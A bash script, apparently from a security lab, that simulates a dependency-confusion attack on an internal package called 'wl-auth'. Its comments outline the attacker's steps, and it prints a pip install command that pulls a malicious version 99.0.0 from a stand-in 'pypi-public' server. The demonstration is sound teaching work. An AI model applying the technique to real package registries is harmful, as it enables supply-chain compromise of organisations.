#!/bin/bash
#
# Simulates an attacker publishing a malicious package to public PyPI.
#
# In the real world, attackers:
# 1. Find internal package names (from leaked requirements.txt, job postings, GitHub repos)
# 2. Register the same name on public PyPI with a much higher version number
# 3. Wait for someone to run `pip install` with --extra-index-url
#
# This script copies the pre-built malicious package to the public PyPI server.
#

set -euo pipefail

echo ""
echo "  =================================================="
echo "  ATTACKER SIMULATION: Publishing malicious package"
echo "  =================================================="
echo ""
echo "  Target package: wl-auth"
echo "  Malicious version: 99.0.0"
echo "  Target registry: public PyPI (http://pypi-public:8080)"
echo ""

# Check if already published
if curl -sf http://pypi-public:8080/simple/wl-auth/ 2>/dev/null | grep -q "wl-auth"; then
    echo "  [!] Package already exists on public PyPI."
    echo "  [!] The attack is ready. Run pip install to trigger it."
else
    echo "  [*] Package not yet on public PyPI."
    echo "  [*] In a real scenario, this is the window where the company is safe."
fi

echo ""
echo "  Check it yourself:"
echo "    curl -s http://pypi-public:8080/simple/wl-auth/"
echo ""
echo "  Now run pip install with --extra-index-url to see the attack:"
echo "    pip install wl-auth --extra-index-url http://pypi-public:8080/simple/ --trusted-host pypi-public"
echo ""
